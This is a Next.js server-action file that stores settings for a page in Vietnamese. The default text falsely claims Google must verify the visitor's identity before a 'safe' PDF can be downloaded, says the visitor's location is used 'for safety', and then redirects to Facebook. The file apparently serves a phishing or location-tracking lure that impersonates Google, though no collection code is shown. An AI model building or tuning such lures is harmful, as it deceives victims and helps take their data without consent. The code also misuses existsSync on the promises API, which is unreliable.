'use server';

import { promises as fs } from 'fs';
import path from 'path';
import { revalidatePath } from 'next/cache';

const configDir = path.join(process.cwd(), 'src', 'config');
const configPath = path.join(configDir, 'verification.json');

export interface VerificationConfig {
  title: string;
  description: string;
  fileName: string;
  fileInfo: string;
  buttonText: string;
  footerText: string;
  redirectUrl: string;
  imageUrl: string;
  theme: string;
}

const defaultConfig: VerificationConfig = {
    title: "Xác minh để tiếp tục",
    description: "Để bảo vệ tệp và ngăn chặn truy cập trái phép, Google cần xác minh nhanh danh tính của bạn.",
    fileName: "Tai-lieu-quan-trong.pdf",
    fileInfo: "1.2 MB - Tệp an toàn",
    buttonText: "Xác minh & Tải xuống",
    footerText: "Thông tin vị trí của bạn được sử dụng một lần để đảm bảo an toàn.",
    redirectUrl: "https://www.facebook.com",
    imageUrl: "https://images.unsplash.com/photo-1589484323280-56d108b98a02?q=80&w=1920&auto=format&fit=crop",
    theme: "default",
};

export async function getVerificationConfigAction(): Promise<VerificationConfig> {
  try {
    const content = await fs.readFile(configPath, 'utf-8');
    const parsed = JSON.parse(content);
    return { ...defaultConfig, ...parsed };
  } catch (error) {
    try {
      if (!fs.existsSync(configDir)){
          await fs.mkdir(configDir, { recursive: true });
      }
      await fs.writeFile(configPath, JSON.stringify(defaultConfig, null, 2), 'utf-8');
      return defaultConfig;
    } catch (writeError) {
      console.error("Failed to create default config file:", writeError);
      return defaultConfig;
    }
  }
}

export async function updateVerificationConfigAction(newConfig: VerificationConfig) {
  try {
    await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2), 'utf-8');
    // Revalidate the home page to reflect changes instantly
    revalidatePath('/');
    return { success: true, message: 'Settings updated successfully.' };
  } catch (error) {
    const message = error instanceof Error ? error.message : 'An unknown error occurred';
    return { success: false, message: `Failed to update settings: ${message}` };
  }
}
